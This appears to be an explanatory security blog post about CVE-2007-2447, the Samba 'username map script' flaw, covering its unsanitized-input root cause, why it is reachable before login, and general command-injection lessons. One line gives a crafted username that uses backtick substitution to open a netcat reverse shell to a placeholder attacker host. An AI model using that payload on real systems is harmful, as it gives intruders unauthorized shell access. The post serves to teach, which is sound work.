CVE-2007-2447 Explained

SecConceptsSambaRCEPublished: Sep 2, 2026

The Samba "username map script" RCE, and why a 19-year-old bug is still one of the clearest examples of unsanitized input reaching a shell.

The feature that caused the problem

Samba supports a configuration option called username map script, which lets an administrator point to an external script that maps incoming usernames to local system usernames. This is useful for environments where the name a client logs in with doesn't match the actual system account. When a client connects, Samba passes the supplied username to that script.

Where it went wrong

The username Samba passed to the script wasn't sanitized. It went straight into a shell command construction. From the vulnerable version of Samba's perspective, a username isn't just a username; it's a string that gets concatenated into a shell command and executed.

A username crafted like this:

/=`nohup nc -e /bin/sh ATTACKER_IP 4444`

doesn't get treated as an unusual-but-harmless login attempt. The backticks trigger command substitution in the shell that ends up running the mapping script, spawning a reverse shell that executes with whatever privileges the Samba service itself has.

Why the attack is authentication-optional in practice

The username is supplied as part of the login attempt, and the vulnerable code path runs during the mapping step, before authentication succeeds or fails. The attacker never needs valid credentials at all; the malicious payload lives in the username field itself, and the damage is done by the time Samba would normally reject a bad login.

Why this is still a great teaching example

Most modern web-focused command injection examples involve some amount of encoding, escaping games, or WAF evasion. This one doesn't. It's about as close to the textbook definition of command injection as a real-world CVE gets: untrusted input, string concatenation into a shell command, no sanitization in between. There's no noise obscuring the core lesson.

It's also a good reminder that "authentication happens before anything dangerous runs" is an assumption, not a guarantee. Plenty of vulnerable code paths execute during steps that feel like they should be safe pre-auth housekeeping.

The general lesson

Any time external input (a username, a filename, a header value) gets passed to something that builds a shell command from it, that's command injection risk, regardless of how mundane the input field seems. "It's just a username" is exactly the kind of assumption that stops people from questioning what happens to that value downstream.

Saw this exploited via Metasploit, immediately landing a root shell with no separate privilege escalation step required, in the Lame writeup.
